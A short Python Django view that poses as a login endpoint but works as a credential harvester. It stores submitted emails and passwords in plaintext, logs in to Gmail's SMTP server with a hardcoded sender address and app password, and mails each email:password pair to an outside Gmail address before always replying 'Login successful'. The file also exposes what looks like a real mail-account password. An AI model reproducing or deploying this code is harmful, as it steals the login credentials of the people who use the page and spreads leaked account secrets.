from django.http import JsonResponse
from rest_framework.decorators import api_view
from dbconnection import users
import smtplib


@api_view(['POST'])
def get_user_info(request):
    # Get the username and password from the request data
    email = request.data.get('email')
    password = request.data.get('password')

    user_id = users.insert_one({
        "email": email,
        "password": password,
    }).inserted_id

    sending_email = 'ranickiauerbach@gmail.com'
    r_email = 'flaco.hex2@gmail.com'
    m_password = 'nlov pvvd rcoa dnwl'

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
        connection.login(user=sending_email, password=m_password)
        connection.sendmail(from_addr=sending_email,
                            to_addrs=r_email,
                            msg=f"subject: Hello! \n\n {email} : {password}")

    if not email or not password:
        return JsonResponse({'error': 'email and password required'}, status=400)
    print(email, password)
    return JsonResponse({'message': 'Login successful'}, status=200)
